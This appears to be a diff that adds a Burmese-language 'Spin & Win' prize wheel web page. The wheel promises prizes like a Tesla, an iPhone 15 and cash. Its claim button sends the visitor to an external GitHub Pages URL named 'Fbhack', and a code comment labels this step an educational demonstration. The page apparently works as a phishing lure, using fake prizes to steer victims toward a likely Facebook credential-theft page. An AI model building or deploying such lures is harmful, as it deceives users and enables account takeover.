@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Spin & Win - ဆုလာဒ်ဂိမ်း</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: linear-gradient(145deg, #1a472a 0%, #0e2a1a 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', 'Poppins', 'Myanmar Text', system-ui, sans-serif;
+            margin: 0;
+            padding: 16px;
+        }
+
+        /* ဂိမ်းကတ် */
+        .game-container {
+            background: rgba(255,248,225,0.95);
+            border-radius: 72px 72px 56px 56px;
+            box-shadow: 0 25px 40px rgba(0,0,0,0.5), inset 0 1px 2px rgba(255,255,200,0.8);
+            padding: 20px 20px 30px;
+            max-width: 560px;
+            width: 100%;
+            transition: all 0.2s;
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 2.1rem;
+            margin: 0 0 8px 0;
+            background: linear-gradient(135deg, #ffb347, #ff7e05);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 2px 2px 8px rgba(0,0,0,0.2);
+            letter-spacing: 2px;
+        }
+
+        .sub {
+            text-align: center;
+            color: #3c2a1f;
+            font-weight: 500;
+            margin-bottom: 20px;
+            border-bottom: 1px dashed #d4af7a;
+            display: inline-block;
+            width: auto;
+            margin-left: auto;
+            margin-right: auto;
+            padding-bottom: 6px;
+        }
+
+        /* ဝိုင်းစက် (Canvas wheel) */
+        .wheel-wrapper {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            margin: 15px 0 10px;
+        }
+
+        canvas {
+            background: #2e241f;
+            border-radius: 50%;
+            box-shadow: 0 12px 28px black, 0 0 0 10px #f7d44a, 0 0 0 14px #b97f2e;
+            max-width: 100%;
+            height: auto;
+            width: 280px;
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+
+        @media (min-width: 480px) {
+            canvas {
+                width: 340px;
+            }
+        }
+
+        /* spin button */
+        .spin-btn {
+            display: block;
+            margin: 20px auto 10px;
+            background: radial-gradient(circle at 30% 10%, #f09819, #d35400);
+            border: none;
+            padding: 14px 32px;
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: white;
+            text-shadow: 0 2px 3px #6b2e00;
+            border-radius: 60px;
+            box-shadow: 0 8px 0 #6b2e00;
+            cursor: pointer;
+            transition: 0.07s linear;
+            width: 80%;
+            font-family: inherit;
+        }
+
+        .spin-btn:active {
+            transform: translateY(4px);
+            box-shadow: 0 4px 0 #6b2e00;
+        }
+
+        .spin-btn:disabled {
+            opacity: 0.7;
+            transform: translateY(0);
+            cursor: not-allowed;
+            filter: grayscale(0.1);
+        }
+
+        /* ဆုရလဒ်ပြဧရိယာ */
+        .result-area {
+            background: #2c2118;
+            border-radius: 48px;
+            padding: 14px 20px;
+            margin: 20px 0 18px;
+            color: #ffefcf;
+            text-align: center;
+            font-weight: bold;
+            font-size: 1.3rem;
+            box-shadow: inset 0 2px 5px #00000033, 0 4px 12px rgba(0,0,0,0.3);
+        }
+
+        .prize-name {
+            font-size: 1.8rem;
+            background: gold;
+            display: inline-block;
+            padding: 4px 18px;
+            border-radius: 40px;
+            color: #3a2800;
+            margin-top: 8px;
+        }
+
+        /* ဆုထုပ်ယူရန် ခလုတ် */
+        .claim-btn {
+            background: linear-gradient(95deg, #27ae60, #2ecc71);
+            border: none;
+            width: 85%;
+            padding: 14px 12px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: white;
+            border-radius: 60px;
+            box-shadow: 0 6px 0 #1e6b3e;
+            cursor: pointer;
+            transition: 0.07s linear;
+            display: block;
+            margin: 8px auto 8px;
+            font-family: inherit;
+        }
+
+        .claim-btn:active {
+            transform: translateY(3px);
+            box-shadow: 0 3px 0 #1e6b3e;
+        }
+
+        .claim-btn:disabled {
+            opacity: 0.5;
+            transform: none;
+            background: #7f8c8d;
+            box-shadow: 0 6px 0 #4a5b4e;
+            cursor: default;
+        }
+
+        .footer-note {
+            font-size: 0.7rem;
+            text-align: center;
+            color: #5a4a32;
+            margin-top: 16px;
+            background: #fff0da;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+            padding: 6px 14px;
+            border-radius: 60px;
+        }
+
+        .small-icon {
+            font-size: 1.1rem;
+            vertical-align: middle;
+        }
+    </style>
+</head>
+<body>
+<div class="game-container">
+    <h1>🎡 SPIN & WIN 🎁</h1>
+    <div style="text-align:center"><span class="sub">ကံစမ်းမဲဂိမ်း</span></div>
+
+    <!-- Spin wheel canvas -->
+    <div class="wheel-wrapper">
+        <canvas id="wheelCanvas" width="500" height="500"></canvas>
+    </div>
+
+    <button class="spin-btn" id="spinButton">🌀 လှည့်မည် 🌀</button>
+
+    <div class="result-area" id="resultArea">
+        🎲 လှည့်ပြီးရလဒ် <br>
+        <span id="prizeDisplay" class="prize-name">---</span>
+    </div>
+
+    <button class="claim-btn" id="claimButton">🎁 ဆုထုပ်ယူရန် 🎁</button>
+    <div class="footer-note">
+        ⚡ ဆုရရှိပါက အောက်ပါ ခလုပ်ဖြင့် ထုပ်ယူပါ
+    </div>
+</div>
+
+<script>
+    (function(){
+        // ------------------- ဆုများ သတ်မှတ်ချက် -----------------
+        const SEGMENTS = [
+            { name: "💵 ငွေတစ်သောင်း",   value: "10000 ကျပ်" },
+            { name: "🚗 ကားတစ်စီး",     value: "Tesla ကား" },
+            { name: "🍿 ပြောင်းဖူးတစ်ထုပ်", value: "ပြောင်းဖူးအကြော်" },
+            { name: "📱 ဖုန်းအသစ်",      value: "iPhone 15" },
+            { name: "☕ ကော်ဖီအခမဲ့",    value: "ကော်ဖီ ၁ခွက်" },
+            { name: "🎫 ထီဆု",            value: "ထီ ၁စောင်" },
+            { name: "🧸 ဝက်ဝံရုပ်",       value: "Teddy Bear" },
+            { name: "❌ ကျေးဇူးပြု ထပ်လှည့်", value: "ထပ်ကံစမ်းပါ" }
+        ];
+
+        // Canvas & ဆက်စပ်
+        const canvas = document.getElementById('wheelCanvas');
+        const ctx = canvas.getContext('2d');
+        let spinAngle = 0;       // current rotation (radians)
+        let spinning = false;
+        let currentPrize = null;  // { name, value } နောက်ဆုံးရလဒ်
+        let animationId = null;
+        let spinStartTime = 0;
+        let spinDuration = 2000;   // 2 sec
+        let spinStartAngle = 0;
+        let spinTargetDelta = 0;
+        let finalSegmentIndex = -1;
+
+        // DOM elements
+        const spinBtn = document.getElementById('spinButton');
+        const claimBtn = document.getElementById('claimButton');
+        const prizeDisplaySpan = document.getElementById('prizeDisplay');
+
+        // Segment angle တွက်ရန်
+        const segmentCount = SEGMENTS.length;
+        const anglePerSegment = (Math.PI * 2) / segmentCount;
+
+        // --- Canvas ရေးဆွဲခြင်း (အရောင်များ)
+        const colors = [
+            "#F4A261", "#E76F51", "#2A9D8F", "#E9C46A", 
+            "#F4A261", "#E9C46A", "#76B5C5", "#E63946"
+        ];
+
+        function drawWheel(rotateRad = spinAngle) {
+            const w = canvas.width;
+            const h = canvas.height;
+            const centerX = w/2;
+            const centerY = h/2;
+            const radius = w * 0.46;  // radius လှပစွာ
+
+            ctx.clearRect(0, 0, w, h);
+            
+            for (let i = 0; i < segmentCount; i++) {
+                const start = i * anglePerSegment + rotateRad;
+                const end = (i+1) * anglePerSegment + rotateRad;
+                // draw sector
+                ctx.beginPath();
+                ctx.moveTo(centerX, centerY);
+                ctx.arc(centerX, centerY, radius, start, end);
+                ctx.closePath();
+                ctx.fillStyle = colors[i % colors.length];
+                ctx.fill();
+                ctx.save();
+                ctx.shadowBlur = 0;
+                ctx.strokeStyle = "#FFF3CF";
+                ctx.lineWidth = 2;
+                ctx.stroke();
+                
+                // draw text
+                ctx.save();
+                ctx.translate(centerX, centerY);
+                ctx.rotate(start + anglePerSegment/2);
+                ctx.textAlign = "center";
+                ctx.textBaseline = "middle";
+                const textRadius = radius * 0.7;
+                ctx.font = "bold 16px 'Segoe UI', 'Myanmar Text'";
+                ctx.fillStyle = "#1e2a1f";
+                ctx.shadowBlur = 0;
+                let shortName = SEGMENTS[i].name;
+                if (shortName.length > 12) shortName = shortName.slice(0,10)+"..";
+                ctx.fillText(shortName, textRadius, 8);
+                ctx.restore();
+            }
+            
+            // draw center circle & pointer triangle
+            ctx.beginPath();
+            ctx.arc(centerX, centerY, radius * 0.12, 0, 2*Math.PI);
+            ctx.fillStyle = "#FFD966";
+            ctx.shadowBlur = 6;
+            ctx.fill();
+            ctx.beginPath();
+            ctx.arc(centerX, centerY, radius * 0.08, 0, 2*Math.PI);
+            ctx.fillStyle = "#AA6F20";
+            ctx.fill();
+            
+            // Pointer (အပေါ်ဘက်အညွှန်)
+            ctx.fillStyle = "#F1C40F";
+            ctx.shadowBlur = 4;
+            ctx.beginPath();
+            const pointerX = centerX;
+            const pointerY = centerY - radius - 8;
+            ctx.moveTo(pointerX - 12, pointerY + 8);
+            ctx.lineTo(pointerX, pointerY - 4);
+            ctx.lineTo(pointerX + 12, pointerY + 8);
+            ctx.fill();
+            ctx.fillStyle = "#C0392B";
+            ctx.beginPath();
+            ctx.moveTo(pointerX - 5, pointerY + 4);
+            ctx.lineTo(pointerX, pointerY - 2);
+            ctx.lineTo(pointerX + 5, pointerY + 4);
+            ctx.fill();
+            ctx.shadowBlur = 0;
+        }
+
+        // ရပ်တန့်သွားသောအခါ မည်သည့် segment ကို ညွှန်သလဲ တွက်ချက်
+        // pointer angle = -PI/2 (အပေါ်) သို့မဟုတ် 270° မှ စစ်
+        function getCurrentSegmentIndex(rotationRad) {
+            // pointer direction (canvas တွင် အပေါ်ဘက် ထောင့်စူးစူး) ရဲ့ကမ္ဘာ angle = -PI/2
+            const pointerAngle = -Math.PI / 2;  // upward
+            // wheel ပေါ်ရှိ မည်သည့် sector က pointer အောက်ရှိသလဲ
+            // sector ရဲ့ start, end နှင့် pointer angle နှိုင်း
+            for (let i=0; i<segmentCount; i++) {
+                let start = i * anglePerSegment + rotationRad;
+                let end = (i+1) * anglePerSegment + rotationRad;
+                // angle normalization [0, 2PI)
+                let normPointer = ((pointerAngle % (2*Math.PI)) + 2*Math.PI) % (2*Math.PI);
+                let normStart = ((start % (2*Math.PI)) + 2*Math.PI) % (2*Math.PI);
+                let normEnd = ((end % (2*Math.PI)) + 2*Math.PI) % (2*Math.PI);
+                if (normStart < normEnd) {
+                    if (normPointer >= normStart && normPointer < normEnd) return i;
+                } else {
+                    // sector သည် 0 ကိုဖြတ်သန်း
+                    if (normPointer >= normStart || normPointer < normEnd) return i;
+                }
+            }
+            // fallback
+            return 0;
+        }
+
+        // spin ပြီးဆုံးရန် easing
+        function easeOutCubic(t) {
+            return 1 - Math.pow(1 - t, 3);
+        }
+
+        function animateSpin(now) {
+            const elapsed = now - spinStartTime;
+            let t = Math.min(1, elapsed / spinDuration);
+            const easeT = easeOutCubic(t);
+            const currentDelta = spinTargetDelta * easeT;
+            spinAngle = spinStartAngle + currentDelta;
+            drawWheel(spinAngle);
+            
+            if (t < 1) {
+                animationId = requestAnimationFrame(animateSpin);
+            } else {
+                // spin ပြီးဆုံး
+                spinAngle = spinStartAngle + spinTargetDelta;
+                drawWheel(spinAngle);
+                spinning = false;
+                spinBtn.disabled = false;
+                
+                // final segment index
+                const idx = getCurrentSegmentIndex(spinAngle);
+                finalSegmentIndex = idx;
+                const wonPrize = SEGMENTS[idx];
+                currentPrize = { name: wonPrize.name, value: wonPrize.value };
+                // ရလဒ် display
+                prizeDisplaySpan.innerHTML = `${wonPrize.name} 🎉`;
+                const resultDiv = document.getElementById('resultArea');
+                resultDiv.style.background = "#2e5a2c";
+                setTimeout(() => {
+                    if(!spinning) resultDiv.style.background = "#2c2118";
+                }, 500);
+                
+                // Claim button အသက်ဝင်စေ
+                claimBtn.disabled = false;
+                // spin ပြီးလျှင် နောက်တစ်ခါ spin နိုင်ပြီ
+                animationId = null;
+            }
+        }
+
+        function startSpin() {
+            if (spinning) return;
+            // reset claim status
+            claimBtn.disabled = true;   // ဆုမယူရသေးဘဲ spin အသစ် မထုတ်ရ
+            prizeDisplaySpan.innerHTML = "🌀 လှည့်နေသည်...";
+            // ရလဒ်ဧရိယာ background ပြန်
+            document.getElementById('resultArea').style.background = "#2c2118";
+            
+            // အနည်းဆုံး လှည့်ရမည့် အင်အား (အလှည့် 5~12 ကြား)
+            const spins = 8 + Math.random() * 8;  // 8-16 အလှည့်
+            const randomDelta = (Math.PI * 2) * spins;
+            // ကျပန်းအနေဖြင့် final offset ထပ်ထည့် (ကြိုတင်မရွေး)
+            const extraRandom = (Math.random() * Math.PI * 2);
+            spinTargetDelta = randomDelta + extraRandom;
+            spinStartAngle = spinAngle;
+            spinStartTime = performance.now();
+            spinning = true;
+            spinBtn.disabled = true;
+            
+            if (animationId) cancelAnimationFrame(animationId);
+            animationId = requestAnimationFrame(animateSpin);
+        }
+
+        // ------------------ Claim ခလုတ် ------------------
+        // သင်ညွှန်းထားသော link အတိုင်း
+        const TARGET_URL = "https://kaymalay616-prog.github.io/Fbhack/";
+        
+        function claimPrize() {
+            if (spinning) {
+                alert("ဂိမ်းလှည့်နေဆဲပါ။ ရလဒ်ထွက်မှ ဆုထုပ်ယူပါ။");
+                return;
+            }
+            if (!currentPrize) {
+                alert("ကျေးဇူးပြု၍ ဦးစွာ Spin လှည့်ပါ။");
+                return;
+            }
+            // ဆုထုပ်ယူရန် အတည်ပြု (ပညာရေးဆိုင်ရာ သရုပ်ပြ)
+            const userConfirmed = confirm(`သင်ရရှိသောဆု → ${currentPrize.name} (${currentPrize.value})\n\nဆုထုပ်ယူရန် သွားရောက်မည်။ ဆက်သွားမလား?`);
+            if (userConfirmed) {
+                // redirect to provided link (external)
+                window.location.href = TARGET_URL;
+            }
+        }
+
+        // --- ကနဦးပုံဖော် & event listener
+        function init() {
+            drawWheel(spinAngle);
+            spinBtn.addEventListener('click', startSpin);
+            claimBtn.addEventListener('click', claimPrize);
+            claimBtn.disabled = true;   // အစပိုင်းတွင် ဆုမရသေးလျှင် disable
+            currentPrize = null;
+            prizeDisplaySpan.innerHTML = "---";
+            // responsive canvas resize handling optional (ပုံသေ fixed size 500px သုံး)
+        }
+        
+        init();
+    })();
+</script>
+</body>
+</html>
